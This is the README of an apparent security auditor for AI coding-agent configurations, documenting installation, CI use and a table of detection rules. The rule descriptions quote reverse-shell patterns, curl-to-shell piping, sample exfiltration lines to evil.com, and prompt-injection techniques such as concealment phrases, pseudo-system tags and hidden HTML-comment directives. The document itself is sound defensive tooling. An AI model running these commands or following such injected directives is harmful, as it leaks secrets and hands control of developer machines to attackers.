<p align="center">
  <img src="assets/cfgaudit.png" alt="cfgaudit" width="460">
</p>

# cfgaudit

Security auditor for AI-agent configuration files.

cfgaudit scans the configuration of AI coding assistants — starting with [Claude Code](https://docs.anthropic.com/en/docs/claude-code) — and flags settings that violate the principle of least privilege or leave sensitive files exposed to the agent's context.

Every finding maps to an [OWASP Top 10 for LLM Applications 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) risk (the primary mapping). Two secondary lenses are also provided: the [OWASP MCP Top 10](#owasp-mcp-top-10-mapping-secondary) for the MCP-server rules, and the [OWASP AISVS 1.0 mapping](docs/aisvs-mapping.md) for teams who verify against the AI Security Verification Standard.

---

## Install

Homebrew (macOS / Linux):

```sh
brew install cfgaudit/tap/cfgaudit
```

With the Go toolchain:

```sh
go install github.com/cfgaudit/cfgaudit/cmd/cfgaudit@latest
```

Or download a pre-built binary (Linux / macOS / Windows, amd64 / arm64) from the [releases page](https://github.com/cfgaudit/cfgaudit/releases).

Container image:

```sh
docker run --rm -v "$PWD:/work" -w /work ghcr.io/cfgaudit/cfgaudit:latest .
```

The image runs unprivileged as uid `65532`, so the files you mount must be readable by that uid (normal `644`/`755` permissions are fine). cfgaudit only reads them — write the report with a shell redirection on the host (`> report.sarif`) rather than into the mount.

---

## Verifying a release

Every release is built by a GitHub Actions workflow that publishes [build provenance](https://slsa.dev/), and the container image is additionally signed with [cosign](https://github.com/sigstore/cosign). Both are keyless — the signing identity *is* the workflow, so a verified artifact provably came from this repository's release pipeline.

**Release archive** — provenance for the archive you downloaded:

```sh
gh attestation verify cfgaudit_1.7.0_linux_amd64.tar.gz -R cfgaudit/cfgaudit
```

**`checksums.txt`** — verify this too if you check downloads against it (the plugin wrapper in `bin/cfgaudit` does):

```sh
gh attestation verify checksums.txt -R cfgaudit/cfgaudit
```

**Container image** — provenance and signature, both bound to the image digest rather than a tag, since a tag can be repointed later:

```sh
DIGEST=$(docker buildx imagetools inspect ghcr.io/cfgaudit/cfgaudit:latest --format '{{.Manifest.Digest}}')

gh attestation verify "oci://ghcr.io/cfgaudit/cfgaudit@$DIGEST" -R cfgaudit/cfgaudit

cosign verify "ghcr.io/cfgaudit/cfgaudit@$DIGEST" \
  --certificate-identity-regexp '^https://github.com/cfgaudit/cfgaudit/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

Attestations are available for releases after v1.7.0; `checksums.txt` coverage starts with the release following that.

### A note on SBOMs

The container image carries its SBOM as a signed attestation. The per-archive `.sbom.json` files, by contrast, are published as **plain release assets, not attestations** — deliberately.

Each one lists cfgaudit itself, its two dependencies (`gopkg.in/yaml.v3`, `github.com/BurntSushi/toml`), the Go standard library, and the archive's own digest. That is the same information `go.mod` already makes public, and the archive it describes is covered by provenance — so a swapped SBOM cannot make a tampered archive verify. If you need an SBOM you can trust end to end, use the image attestation, or regenerate one from a verified archive with [syft](https://github.com/anchore/syft).

---

## Usage

```sh
# Audit the current directory
cfgaudit

# Audit a specific project root
cfgaudit /path/to/project

# Output format defaults to "auto": a table on an interactive terminal, plain
# text when piped or redirected. Force either with --format table / --format text.
cfgaudit --format table

# Output as JSON (for CI integration)
cfgaudit --format json

# Output as SARIF 2.1.0 (for GitHub Code Scanning)
cfgaudit --format sarif > cfgaudit.sarif

# Output as Code Climate JSON (for GitLab Code Quality / merge-request findings)
cfgaudit --format codeclimate > gl-code-quality.json

# Override the Claude Code version used for rule gating (otherwise detected via `claude --version`)
cfgaudit --claude-version 2.1.148

# Print cfgaudit version and exit
cfgaudit --version

# Run only specific rules (CSV or repeated; --only and --skip can be combined)
cfgaudit --only CFG001,CFG003
cfgaudit --only CFG001 --only CFG003
cfgaudit --skip CFG006,CFG009

# Use an explicit config file (otherwise .cfgaudit.yml is auto-discovered)
cfgaudit --config path/to/.cfgaudit.yml

# Also scan a Claude Code plugin/skill package
cfgaudit --plugins ./my-plugin

# Zero-tolerance CI: make warn findings fail the build too
cfgaudit --strict

# Deeper shell analysis of hook commands (CFG045, needs the shellcheck binary)
cfgaudit --shellcheck

# Explain a rule in the terminal (renders its docs)
cfgaudit explain CFG001

# List all rules (filter by OWASP — LLM or MCP — or output JSON)
cfgaudit list
cfgaudit list --owasp LLM06
cfgaudit list --owasp MCP05
cfgaudit list --format json

# Scaffold a hardened .claude/settings.json for a new project
cfgaudit init                       # write a safe-default deny list
cfgaudit init --dry-run             # print the JSON without writing
cfgaudit init --interactive         # add project-specific deny entries

# Sync deny rules between settings.json and .cfgaudit.yml policy
cfgaudit policy generate            # settings.json permissions.deny -> .cfgaudit.yml require-deny
cfgaudit policy apply --dry-run     # preview: .cfgaudit.yml require-deny -> settings.json permissions.deny
cfgaudit policy apply               # write the missing deny entries
```

**`init` subcommand** — scaffolds `.claude/settings.json` with a hardened baseline `permissions.deny` (credential/key/cloud/SSH read-denies plus destructive/network/privilege command classes) so a fresh project starts safe-by-default and passes the policy rules (CFG006/CFG041–CFG044) immediately. Aborts if the file exists (use `--force`, or `cfgaudit policy apply` to merge); `--dry-run` prints the JSON; `--interactive` adds project-specific entries.

**`policy` subcommand** — keeps `permissions.deny` (enforced by Claude Code) and `policy.require-deny` (audited by cfgaudit / CFG025) in sync. `generate` freezes the current runtime deny list as an auditable policy, preserving the rest of your `.cfgaudit.yml` (comments included). `apply` rolls a policy out to a project's settings; both merge **additively** (nothing is removed) and are idempotent. `apply` rewrites `settings.json` as 2-space-indented JSON with alphabetically-ordered top-level keys — run `--dry-run` first to preview.

**Scope-aware findings**

Each finding carries a `Scope` (`project`, `project-local`, or `user`) reflecting which file it came from. Rules whose blast radius is amplified when the misconfiguration lives in user-global settings append an explanatory note to the message, and `CFG009` (hook command interpolates a shell variable) escalates from `warn` to `error` at user scope — a malicious hook in `~/.claude/settings.json` fires on every project the user opens.

**Version gating**

Some rules require a minimum Claude Code release before they make sense. cfgaudit runs `claude --version` once per invocation, compares the result to each rule's `MinVersion`, and replaces below-threshold rules with a single `info`-severity skip notice. The detected version is logged to stderr at the start of each scan; the `--claude-version` flag overrides detection (useful in CI containers where the binary is not installed). When neither detection nor the flag yields a version, every rule runs unconditionally.

**Exit codes**

| Code | Meaning |
|------|---------|
| `0` | No findings, or only `warn`/`info` (without `--strict`) |
| `1` | At least one `error`-severity finding (or any `warn` under `--strict` / `strict: true`) |
| `2` | Tool error (file not found, parse error) |

**Suppressing a finding**

Add a comment on the same line or the line above in the relevant config file:

```json
// cfgaudit:ignore CFG001 -- intentional for local dev sandbox
```

**Configuration file (`.cfgaudit.yml`)**

cfgaudit auto-discovers a `.cfgaudit.yml` (or `.cfgaudit.yaml`) in the scanned directory; `--config <path>` overrides discovery. CLI flags take precedence over the file.

```yaml
# Per-rule overrides
rules:
  CFG003: off           # disable a rule (flat form)
  CFG004:
    severity: warn      # override a rule's severity (also accepts the flat form CFG004: warn)

# Drop findings below this severity ("error", "warn", "info")
min-severity: warn

# Treat warn findings as errors for the exit code
strict: false

# Always exit 0 on a successful run (advisory mode for non-blocking CI)
no-exit-codes: false

# Run shellcheck on hook/helper commands (CFG045; needs the shellcheck binary)
shellcheck: false

# Path globs (relative to the scanned dir) whose findings are excluded.
# Supports *, ** and a trailing / for directory prefixes.
exclude-paths:
  - vendor/
  - "**/.claude/settings.local.json"

# Org policy (CFG025): commands that must be denied / must not be allowed.
# Matching is containment-aware (Bash(git:*) covers Bash(git commit:*)).
policy:
  require-deny:
    - "Bash(git commit:*)"   # must be covered by permissions.deny
  forbid-allow:
    - "Bash(git commit:*)"   # must not be grantable by permissions.allow
```

---

## GitHub Action

Run cfgaudit in a workflow without installing anything — the action wraps the published container image:

```yaml
- uses: cfgaudit/cfgaudit@v1
  with:
    path: .
```

Upload findings to GitHub Code Scanning via SARIF (add `permissions: security-events: write` to the job):

```yaml
- uses: cfgaudit/cfgaudit@v1
  with:
    format: sarif
    output: cfgaudit.sarif
    fail-on: never          # advisory: let Code Scanning surface findings, don't fail the step
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: cfgaudit.sarif
```

**Inputs:** `path` (default `.`), `format` (`text`/`json`/`sarif`), `strict`, `user`, `config`, `plugins`, `output`, `fail-on` (`error`/`never`), `image`.
**Outputs:** `exit-code`, `output-file`. By default the step fails on findings at or above the configured threshold; set `fail-on: never` for advisory mode.

---

## GitLab CI/CD component

For GitLab pipelines, include the component (published to the [CI/CD Catalog](https://docs.gitlab.com/ci/components/)):

```yaml
include:
  - component: gitlab.com/cfgaudit/cfgaudit/cfgaudit@v1.7.0
    inputs:
      path: .
      format: text
```

Inputs: `stage`, `path`, `format`, `version` (pinned ghcr.io image tag), `allow_failure`. The job fails the pipeline on `error`-severity findings unless `allow_failure: true`.

To surface findings **inline in merge requests** via the Code Quality widget, use the second component (emits a GitLab Code Quality report):

```yaml
include:
  - component: gitlab.com/cfgaudit/cfgaudit/cfgaudit-code-quality@v1.7.0
    inputs:
      path: .
```

Pin the component to a released tag, not a moving ref — consistent with cfgaudit's own supply-chain guidance (CFG010/CFG013).

---

## Claude Code plugin

The repo doubles as a Claude Code plugin marketplace. Install it to get an on-demand scan command plus automatic scans when config files change:

```
/plugin marketplace add cfgaudit/cfgaudit
/plugin install cfgaudit@cfgaudit
```

The plugin adds:

- **`/cfgaudit:scan`** — scan the current project on demand.
- **`/cfgaudit:explain <RULE>`** — explain a rule (what it checks, why, how to fix); with no argument it lists the rules.
- **`/cfgaudit:init`** — scaffold a **project-aware** `.claude/settings.json`: Claude inspects the project's tooling and tailors the deny list on top of the baseline, then verifies 0 findings.
- A **Stop hook** (scan when a session ends) and a **PostToolUse hook** (scan after edits to `settings.json` / `CLAUDE.md` / `.mcp.json` / `.claude/` files).

Hooks call a `cfgaudit` binary on your `PATH` (install via Homebrew or `go install` above); if none is found the bundled wrapper downloads the matching prebuilt release binary for your OS/arch (checksum-verified and cached) — **no Go toolchain required**. Team rollout via `.claude/settings.json`:

```json
{
  "extraKnownMarketplaces": {
    "cfgaudit": { "source": { "source": "github", "repo": "cfgaudit/cfgaudit" } }
  }
}
```

---

## What cfgaudit checks

Rules are grouped by the part of the configuration they target.

### `settings.json` — permissions, env, hooks & files

General Claude Code settings: the permission model, environment block, lifecycle hooks, command-running helpers, schema, and local-file hygiene.

| ID | Severity | Description | OWASP |
|----|----------|-------------|-------|
| [CFG001](docs/rules/CFG001.md) | error | `permissions.allow` grants unrestricted shell — `Bash(*)`/`Bash(**)`, bare `Bash`, or `PowerShell`/`PowerShell(*)` | LLM06 |
| [CFG002](docs/rules/CFG002.md) | warn | `permissions.allow` grants unrestricted file-write — `Edit(*)`/`Write(*)` or bare `Edit`/`Write` | LLM06 |
| [CFG040](docs/rules/CFG040.md) | warn | `permissions.allow` contains unrestricted `WebFetch` (bare / `domain:*`) — fetch-any-URL exfiltration channel | LLM06 |
| [CFG023](docs/rules/CFG023.md) | error/warn | `permissions.allow` grants a dangerous command with wildcard args (`curl`/`sudo`/`npx`/shells → error; `find`/`sed`/`git`/interpreters/`ssh` → warn) | LLM06 |
| [CFG025](docs/rules/CFG025.md) | error | custom org policy from `.cfgaudit.yml` violated (`require-deny` / `forbid-allow`) — inert unless a `policy:` is configured | LLM06 |
| [CFG004](docs/rules/CFG004.md) | error/warn | `defaultMode` set to `bypassPermissions` or `auto` | LLM06 |
| [CFG085](docs/rules/CFG085.md) | error/warn | subagent frontmatter in `.claude/agents/*.md` weakens the permission mode (`permissionMode: bypassPermissions`/`dontAsk` → error; `auto`/`acceptEdits` → warn) — CFG004's modes reached through a committed agent file | LLM06 |
| [CFG079](docs/rules/CFG079.md) | error/warn | `autoMode` weakens the auto-mode permission classifier — a broad `allow` entry (`*`/`Bash(*)` → error) or a `soft_deny` array that drops the built-in defaults by omitting `"$defaults"` (→ warn) | LLM06 |
| [CFG005](docs/rules/CFG005.md) | error | `ANTHROPIC_BASE_URL` points to a non-Anthropic endpoint (CVE-2026-21852) | LLM02 |
| [CFG046](docs/rules/CFG046.md) | warn/error | `OTEL_EXPORTER_OTLP_*ENDPOINT` redirects telemetry to a non-local collector (error for a raw IP) | LLM02 |
| [CFG006](docs/rules/CFG006.md) | warn | `permissions.deny` is absent or empty — no guardrails block destructive operations | LLM06 |
| [CFG041](docs/rules/CFG041.md) | error | `permissions.deny` exists but does not restrict `.env` files — Claude can read credentials | LLM02 |
| [CFG042](docs/rules/CFG042.md) | error | `permissions.deny` does not restrict private-key / certificate files (`*.pem`/`*.key`/`*.p12`/`*.pfx`/`*.jks`) | LLM02 |
| [CFG043](docs/rules/CFG043.md) | error | `permissions.deny` does not restrict cloud credential files (AWS `.aws`, GCP `gcloud`, Azure `.azure`) | LLM02 |
| [CFG044](docs/rules/CFG044.md) | error | `permissions.deny` does not restrict SSH private keys (`.ssh/`, `id_rsa`/`id_ed25519`/…) | LLM02 |
| [CFG007](docs/rules/CFG007.md) | error | `env` block contains a hardcoded secret (vendor key prefix or `*_TOKEN`/`*_SECRET`/...) | LLM02 |
| [CFG073](docs/rules/CFG073.md) | error | `env`/MCP `env`/`headers` value is a hardcoded cryptocurrency signing credential — Ethereum private key (`0x`+64 hex) or BIP-39 seed phrase — which **cannot be rotated**; CFG054's entropy heuristic misses both | LLM02 |
| [CFG008](docs/rules/CFG008.md) | error | command matches a reverse-shell pattern (`/dev/tcp/`, `nc -e`, `bash -i …`, `mkfifo`, `socat exec`) — scans hooks, credential/runtime helpers, and MCP `headersHelper` | LLM06 |
| [CFG009](docs/rules/CFG009.md) | warn/error | command interpolates a shell variable (`$VAR` / `${VAR}`) — attacker-influenced data may reach a shell; escalates to `error` at user scope | LLM01 |
| [CFG012](docs/rules/CFG012.md) | warn | `settings.json` contains an unknown top-level key or a value whose type contradicts the bundled SchemaStore schema | LLM02 |
| [CFG013](docs/rules/CFG013.md) | warn | `.claude/settings.local.json` or `CLAUDE.local.md` exists in the repo but is not excluded by `.gitignore` | LLM02 |
| [CFG014](docs/rules/CFG014.md) | error | command pipes `curl`/`wget` output directly into a shell or interpreter (remote code execution) | LLM03 |
| [CFG015](docs/rules/CFG015.md) | warn/error | command contains `$(…)` or backtick substitution (error if the substitution itself reaches the network) | LLM01 |
| [CFG016](docs/rules/CFG016.md) | error/info | credential helper (`apiKeyHelper`, `awsCredentialExport`, `awsAuthRefresh`, `gcpAuthRefresh`) defined in project-scoped settings (CVE-2025-59536) | LLM02 |
| [CFG022](docs/rules/CFG022.md) | error/warn | `sandbox` config weakens or hijacks the execution sandbox (`excludedCommands` wildcard/shell, `bwrapPath`/`socatPath`, user-scope `allowAppleEvents`) (CVE-2026-39861) | LLM06 |
| [CFG027](docs/rules/CFG027.md) | error | command installs a persistence mechanism (cron, shell startup files, `systemctl enable`, launchd) — scans hooks and helpers | LLM06 |
| [CFG028](docs/rules/CFG028.md) | error | command writes to a Claude trust/config file (`CLAUDE.md`, `settings.json`, `.mcp.json`, `.claude/`) — self-perpetuating injection / persistence | LLM06 |
| [CFG037](docs/rules/CFG037.md) | error | command reads or copies SSH private keys (`~/.ssh/id_rsa`, `id_ed25519`, …) — scans hooks and helpers | LLM02 |
| [CFG078](docs/rules/CFG078.md) | error | command reads an OS credential store — macOS Keychain (`security find-*-password`/`dump-keychain`), Linux keyring (`secret-tool lookup`), `/etc/shadow` (`getent shadow`), or a browser saved-password DB (`logins.json`/`key4.db`/`Login Data`) — scans hooks and helpers | LLM02 |
| [CFG038](docs/rules/CFG038.md) | error | command dumps environment variables to the network (`env`/`printenv` → `curl`/`nc`) — exfiltrates all secrets | LLM02 |
| [CFG072](docs/rules/CFG072.md) | error | command encodes a `$(…)`/backtick substitution into a DNS query name or URL host (`dig "$(cat secret).evil.com"`, `curl http://$(env).evil.com`) — exfiltrates data over UDP/53, the channel CFG038 misses | LLM02 |
| [CFG039](docs/rules/CFG039.md) | warn/error | command runs a recursive force-delete (`rm -rf`) — error when the target is broad (`~`, `/`, `..`, `$HOME`, `*`) | LLM06 |
| [CFG077](docs/rules/CFG077.md) | error | command destroys an audit trail — clears shell history (`history -c`, `unset HISTFILE`), purges system logs (`journalctl --vacuum`, `rm /var/log`), or shreds files (`shred`/`srm`) — anti-forensics that hides another action | LLM06 |
| [CFG082](docs/rules/CFG082.md) | warn/error | Docker daemon redirected off-host — `DOCKER_HOST` env or a `docker -H`/`--host` flag pointing at a remote `tcp://`/`ssh://` daemon (error for a raw IP) — runs containers on and reads context from a machine you may not control | LLM02 |
| [CFG084](docs/rules/CFG084.md) | warn | container image trust verification disabled — `DOCKER_CONTENT_TRUST=0`, `--disable-content-trust` or `--insecure-registry` in a command site, `settings.json` `env` or an MCP server `env` — `docker pull` then accepts an unsigned or substituted image | LLM03 |
| [CFG045](docs/rules/CFG045.md) | error/warn/info | ShellCheck analysis of hook/helper commands (opt-in `--shellcheck`; SC codes in the message) | LLM06 |
| [CFG067](docs/rules/CFG067.md) | warn | hooks defined in a project-scoped `.claude/settings.json` — committed hooks run on every developer who opens the repo (CVE-2025-59536); content checks (CFG008/014/…) fire separately | LLM03 |

### MCP servers — `settings.json` `mcpServers` & `.mcp.json`

Rules about MCP servers. MCP is a shared standard, so the per-server checks (CFG010–CFG021) are **cross-agent**: they run against the inline `mcpServers` block in `settings.json`, the project's root `.mcp.json` (the file that `enableAllProjectMcpServers` / `enabledMcpjsonServers` auto-approve), and other agents' MCP configs when present — `.cursor/mcp.json` (+ `~/.cursor/mcp.json` with `--user`), `.vscode/mcp.json` (VS Code's top-level `servers` key is handled), `cline_mcp_settings.json`, Windsurf's `~/.codeium/windsurf/mcp_config.json`, the `context_servers` block of Zed's project-scoped `.zed/settings.json` (JSONC), the `mcpServers` block of Devin CLI's `.devin/config.json` (whose `transport` field is folded into `type`), the `mcpServers` block of Gemini CLI's `.gemini/settings.json` (+ `~/.gemini/settings.json` with `--user`), the `[mcp_servers]` tables of OpenAI Codex CLI's `~/.codex/config.toml` (with `--user`), and the `mcpServers` list of Continue's `.continue/config.yaml` (+ `~/.continue/config.yaml` with `--user`). Each finding is attributed to the file the server was declared in. A malformed config is reported as a tool error rather than silently skipped. `CFG003` governs the blanket auto-approval flag and is Claude Code–specific (`settings.json` only).

| ID | Severity | Description | OWASP |
|----|----------|-------------|-------|
| [CFG003](docs/rules/CFG003.md) | error | `enableAllProjectMcpServers: true` — auto-approves all repo MCP servers (CVE-2025-59536) | LLM06 |
| [CFG053](docs/rules/CFG053.md) | error/warn | blanket MCP-trust settings — `allowAllClaudeAiMcps: true`, `enabledMcpjsonServers` with `*`/huge list, or a wildcard `allowedMcpServers` `serverUrl` | LLM06 |
| [CFG055](docs/rules/CFG055.md) | error/warn | committed settings `enabledPlugins` auto-enables a plugin (loads its hooks/MCP) or `extraKnownMarketplaces` registers a third-party marketplace | LLM03 |
| [CFG010](docs/rules/CFG010.md) | warn | MCP server uses unpinned package or image version (`@latest`, `:latest`, no `@version`; npx/pnpm/yarn/bunx + uvx/pipx `==` pins) | LLM03 |
| [CFG011](docs/rules/CFG011.md) | warn | MCP server `alwaysAllow` is too broad (wildcard, state-mutating tools, or 10+ entries) | LLM06 |
| [CFG017](docs/rules/CFG017.md) | error | MCP server sets `dangerouslyAllowBrowser: true` — browser-originated requests enable DNS-rebinding to RCE (CVE-2025-49596) | LLM06 |
| [CFG018](docs/rules/CFG018.md) | warn | MCP server binds to all interfaces (`0.0.0.0` / `[::]`) — reachable by anyone on the LAN ("NeighborJack") | LLM06 |
| [CFG019](docs/rules/CFG019.md) | error | MCP server `command` runs an inline script — a shell interpreter (`bash`/`pwsh`/…) or a language interpreter with an eval flag (`node -e`, `python -c`, `deno eval`, …) — a hallmark of a poisoned config (CVE-2026-21518) | LLM06 |
| [CFG020](docs/rules/CFG020.md) | error | MCP server `env` injects code at startup — dynamic linker (`LD_PRELOAD`/`DYLD_*`) or interpreter startup vectors `BASH_ENV`/`PYTHONSTARTUP`/`NODE_OPTIONS`/`RUBYOPT`/`PERL5OPT` (CVE-2026-44995) | LLM06 |
| [CFG021](docs/rules/CFG021.md) | warn | MCP server `env` routes traffic through a non-local proxy (`HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY`) — MITM and header-secret capture | LLM02 |
| [CFG049](docs/rules/CFG049.md) | error/warn | remote MCP server `url` points to a non-loopback host (cleartext `http://`/`ws://` or raw IP → error; TLS hostname → warn) — exfiltration / MITM channel | LLM02 |
| [CFG050](docs/rules/CFG050.md) | error | MCP server `env` or `headers` contains a hardcoded secret (vendor key pattern, secret-like name, or auth header with a literal credential) | LLM02 |
| [CFG054](docs/rules/CFG054.md) | warn | high-entropy value in `env`/`headers` that looks like a hardcoded secret under an innocuous key name (entropy fallback to CFG007/CFG050) | LLM02 |
| [CFG052](docs/rules/CFG052.md) | warn | MCP server name declared in multiple sources (`settings.json` `mcpServers` + `.mcp.json`) — ambiguous precedence / shadowing | LLM03 |
| [CFG066](docs/rules/CFG066.md) | warn/error | MCP server `env` sets a wildcard CORS origin (`*`) — any web page can call it; error when authentication is also disabled (CVE-2026-33010) | LLM06 |
| [CFG068](docs/rules/CFG068.md) | error | MCP server forwards a templated credential (`{{TOKEN}}`/`${SECRET}` in an auth header/env) to a cleartext or raw-IP endpoint — runtime expands it to a real secret sent there (CVE-2026-31951) | LLM02 |
| [CFG069](docs/rules/CFG069.md) | warn | MCP server `env` enables HTTP transport without log redaction / a quiet log level — request bodies (Bearer tokens, API keys) get logged (CVE-2026-42282/41495) | LLM02 |
| [CFG075](docs/rules/CFG075.md) | error | MCP server `env`/`args` disables TLS certificate verification (`NODE_TLS_REJECT_UNAUTHORIZED=0`, `GIT_SSL_NO_VERIFY`, `--insecure`, `sslmode=disable`, …) — turns an `https://` endpoint into a MITM-able channel | LLM02 |
| [CFG076](docs/rules/CFG076.md) | error/warn | MCP server `args` expose a broad filesystem root (`/`, `~`, `$HOME`, drive root → error; `..` parent traversal → warn) — a filesystem server scoped to the whole machine/home instead of one directory | LLM06 |
| [CFG083](docs/rules/CFG083.md) | error | MCP server `args` carry a Chromium command-replacing launch switch (`--utility-cmd-prefix`, `--renderer-cmd-prefix`, `--gpu-launcher`, `--browser-subprocess-path`) — launching the browser runs an arbitrary binary (CVE-2026-57572 class); debugger/profiler prefixes are not flagged | LLM06 |
| [CFG070](docs/rules/CFG070.md) | warn | MCP server `command` is a repo-relative path (`./x`, `scripts/x`) — a committed in-repo executable that auto-runs on clone (CVE-2025-54135) | LLM03 |
| [CFG058](docs/rules/CFG058.md) | warn | MCP server uses the deprecated `type: "sse"` transport — superseded by Streamable HTTP (`type: "http"`); weaker transport with DNS-rebinding/Origin pitfalls | LLM02 |
| [CFG059](docs/rules/CFG059.md) | error/warn | MCP server / hook package or endpoint host is a typosquat of a known-good identifier — covers `mcpServers` launchers and `npx`/`bunx`/`pnpm dlx`/`yarn dlx` packages run from any command site (homoglyph / one-char → error; two-char / unofficial scope → warn) | LLM03 |

#### OWASP MCP Top 10 mapping (secondary)

The MCP-server rules above carry a **secondary** mapping to the [OWASP Top 10 for Model Context Protocol](https://owasp.org/www-project-mcp-top-10/), in addition to their primary LLM Top 10 risk. It is a complementary lens for readers who think in the MCP taxonomy; the LLM mapping stays primary.

> **Provisional.** Mapped against **OWASP MCP Top 10 v0.1 (Beta, Phase 3)** — IDs and titles may still change before final release. Filter from the CLI with `cfgaudit list --owasp MCP05`.

| OWASP MCP (v0.1) | Rules |
|------------------|-------|
| MCP01 – Token Mismanagement & Secret Exposure | CFG021, CFG049, CFG050, CFG054, CFG058, CFG068, CFG069, CFG075 |
| MCP02 – Privilege Escalation via Scope Creep | CFG003, CFG011, CFG053, CFG076 |
| MCP04 – Software Supply Chain Attacks & Dependency Tampering | CFG010, CFG055, CFG059, CFG070 |
| MCP05 – Command Injection & Execution | CFG017, CFG019, CFG020, CFG083 |
| MCP07 – Insufficient Authentication & Authorization | CFG018, CFG066 |
| MCP09 – Shadow MCP Servers | CFG052 |

MCP03 (Tool Poisoning), MCP06 (Intent Flow Subversion), MCP08 (Lack of Audit & Telemetry), and MCP10 (Context Injection & Over-Sharing) have no dedicated config rule yet — they involve runtime tool behaviour or live server inspection rather than a statically committed config surface.

### Instruction files — `CLAUDE.md` & other agents

AI coding agents read their instruction files as trusted system-context every session, so a committed or user-global instruction file is a prompt-injection target. The project `CLAUDE.md` is scanned automatically and `~/.claude/CLAUDE.md` with `--user`. The same content rules also scan, when present in the project: `.cursorrules`, `.cursor/rules/*.{md,mdc}`, `.windsurfrules`, `.windsurf/rules/*.md`, `AGENTS.md`, `GEMINI.md` (Gemini CLI; `~/.gemini/GEMINI.md` with `--user`), GitHub Copilot's `.github/copilot-instructions.md` and path-specific `.github/instructions/*.instructions.md`, and Claude Code's custom **subagents** (`.claude/agents/*.md`), **slash commands** (`.claude/commands/*.md`), **skills** (`.claude/skills/*/SKILL.md`), and **modular rules** (`.claude/rules/**/*.md`, discovered recursively) — these also under `~/.claude/` with `--user`. Findings name the file they came from.

| ID | Severity | Description | OWASP |
|----|----------|-------------|-------|
| [CFG024](docs/rules/CFG024.md) | error | instruction file contains hidden Unicode control characters (Tags block, zero-width, BiDi/Trojan Source) — prompt injection / ASCII smuggling | LLM01 |
| [CFG026](docs/rules/CFG026.md) | error/warn | instruction file contains instruction-bypass phrases (override / persona hijack / authority impersonation → error; permissive fictional framing → warn) | LLM01 |
| [CFG029](docs/rules/CFG029.md) | error | instruction file instructs the agent to bypass permission prompts ("always approve", "without asking", …) — NL equivalent of `defaultMode: bypassPermissions` | LLM06 |
| [CFG030](docs/rules/CFG030.md) | error | instruction file instructs the agent to conceal its behavior ("don't tell the user", "silently exfiltrate", …) | LLM01 |
| [CFG031](docs/rules/CFG031.md) | error/warn | instruction file references a sensitive file path (`~/.ssh/id_rsa`, `~/.aws/credentials`, `*.pem`, …) — error when read/sent (exfiltration), warn on a bare mention | LLM02 |
| [CFG032](docs/rules/CFG032.md) | error/warn | instruction file contains pseudo-system tags (`<SYSTEM>`), turn-boundary/role injection (`Human:`/`<human>`) → error; generic all-caps tags & foreign-LLM control tokens → warn | LLM01 |
| [CFG033](docs/rules/CFG033.md) | error | instruction file contains a markdown image with an empty/placeholder query param (`![](https://x?d=)`) — data-exfiltration sink | LLM02 |
| [CFG034](docs/rules/CFG034.md) | warn | instruction file contains Guidance/template role delimiters (`{{#system~}}` …) — role-injection markup | LLM01 |
| [CFG035](docs/rules/CFG035.md) | error/warn | instruction file instructs the agent to configure or trust an MCP server — trust/allow-all → error; add/install (`claude mcp add`, skipped in code blocks) → warn | LLM06 |
| [CFG036](docs/rules/CFG036.md) | error/warn | instruction file embeds shell commands for auto-execution/exfiltration (cmd-subst on secret paths, auto-exec + `curl https://…`) | LLM02 |
| [CFG057](docs/rules/CFG057.md) | warn | instruction file embeds an encoded payload — a `data:` URI or base64 blob that decodes to an injection phrase or command (evades CFG024/CFG026) | LLM01 |
| [CFG080](docs/rules/CFG080.md) | error | instruction file hides a directive inside an HTML comment (`<!-- you must… / silently POST… -->`) — invisible in rendered Markdown but read by the agent (comment-syntax sibling of CFG024) | LLM01 |
| [CFG081](docs/rules/CFG081.md) | error | instruction file tells the agent to survive context compaction/summarization (`preserve these instructions across compaction`) — persistence directive that makes an injection durable | LLM01 |
| [CFG051](docs/rules/CFG051.md) | error/warn | skill/command/subagent frontmatter `allowed-tools` grants unrestricted shell or all tools (`Bash`, `*`, `all`) — not narrowed by `disallowed-tools` | LLM06 |
| [CFG056](docs/rules/CFG056.md) | warn | model-invocable skill/command/subagent has a broad/always-on `description` or `triggers` entry ("for every request", "always invoke") — behaviour-hijack via greedy selection | LLM01 |

### Plugin & skill packages

Installing a Claude Code plugin is a supply-chain trust decision. With `--plugins <dir>` (and auto-discovered when the scanned project bundles a `.claude-plugin/`, or `~/.claude/plugins/` under `--user`), cfgaudit looks **inside** the package and runs the existing rules against its bundled artifacts:

| Artifact | Rules applied |
|----------|---------------|
| `SKILL.md` | CLAUDE.md content rules — CFG024 (hidden Unicode), CFG026 (instruction-bypass) |
| `hooks/hooks.json` | command-content rules — CFG008, CFG009, CFG014, CFG015, CFG027, CFG028; instruction-content rules over `type: "prompt"` / `type: "agent"` hook prompts — CFG024, CFG026, CFG029–CFG036, CFG057 |
| `plugin.json` `mcpServers` | MCP rules — CFG010, CFG011, CFG017–CFG021 |

Findings are attributed to the in-package file. Bundled binaries / arbitrary scripts are **not** content-scanned (that is general SAST, outside cfgaudit's config-audit scope).

### Agent-skills lockfile — `skills-lock.json`

The [vercel-labs/skills](https://github.com/vercel-labs/skills) CLI (skills.sh) records the external sources it pulls agent **skills** (instruction content) from in a `skills-lock.json` at the repo root. cfgaudit scans the committable project-root file; the user-global `~/.agents/.skill-lock.json` is out of scope (not committable).

| Rule | Severity | What it flags | OWASP |
|------|----------|---------------|-------|
| [CFG074](docs/rules/CFG074.md) | warn | a `skills-lock.json` entry pulls skill content from a remote source with **no integrity pin** — no content hash (`computedHash`/`integrity`), resolved `commit`, or full-SHA `ref` — so an upstream owner can change the installed skill text under every contributor (pinned entries and `local` sources are not flagged) | LLM03 |

### VS Code workspace — `.vscode/`

`.vscode/` files are committed into repositories and read by VS Code **and its forks (Cursor, Windsurf)**, so a committed workspace config is a repo-controlled auto-run / supply-chain surface. cfgaudit scans these automatically when present and attributes findings to the source file.

| ID | Severity | Description | OWASP |
|----|----------|-------------|-------|
| [CFG047](docs/rules/CFG047.md) | error | `.vscode/tasks.json` task runs on folder open (`runOptions.runOn: "folderOpen"`) — zero-click code execution when the repo is opened; silent (`presentation.reveal: "never"`) is called out | LLM06 |
